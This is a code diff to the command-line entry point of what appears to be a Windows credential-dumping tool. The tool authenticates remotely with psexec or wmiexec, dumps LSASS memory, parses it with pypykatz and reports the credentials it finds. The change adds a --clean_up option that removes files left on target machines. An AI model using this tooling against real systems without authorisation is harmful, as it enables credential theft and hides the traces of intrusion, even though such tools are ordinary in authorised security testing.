@@ -21,6 +21,11 @@ def main():
         help="equals 1 or 0| Creds obtaining location will be written in report file",
     )
     parser.add_argument("--auth", help="Auth with psexec or wmiexec")
+    parser.add_argument(
+        "--clean_up",
+        type=bool,
+        help="In case if execution left files on computer, use this to delete those",
+    )
     args = parser.parse_args()
     if len(sys.argv) > 1:
         pass
@@ -52,6 +57,10 @@ def main():
                     auth=auth,
                     hashes=hashes,
                 )
+                if args.clean_up is not None:
+                    task.clean_up()
+                    sys.exit(0)
+
                 task.run()
                 Dumper.dump_to_pypykatz(dump_file="./lsass_dump.dmp")
                 Dumper.create_report(
@@ -69,6 +78,9 @@ def main():
             auth=auth,
             hashes=hashes,
         )
+        if args.clean_up is not None:
+            task.clean_up()
+            sys.exit(0)
         task.run()
         Dumper.dump_to_pypykatz(dump_file="./lsass_dump.dmp")
         Dumper.create_report(
